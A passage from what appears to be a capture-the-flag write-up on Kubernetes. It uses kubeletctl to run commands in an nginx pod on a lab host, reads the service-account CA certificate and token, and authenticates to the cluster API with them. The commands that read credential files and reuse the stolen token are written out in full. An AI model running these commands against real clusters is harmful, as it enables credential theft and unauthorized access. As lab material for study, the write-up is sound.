____

ServiceAccount object, which is managed by Kubernets and provides identity within the pod. It gives three typical directories:

- `/run/secrets/kubernetes.io/serviceaccount`
- `/var/run/secrets/kubernetes.io/serviceaccount`
- `/secrets/kubernetes.io/serviceaccout`

https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration

```bash
kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
```

With the `ca.crt` and the `token`, I can authenticate to the cluster.

```bash
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt

kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token
```

## auth to kubernetes API

```bash
export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
```

```bash
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod
```

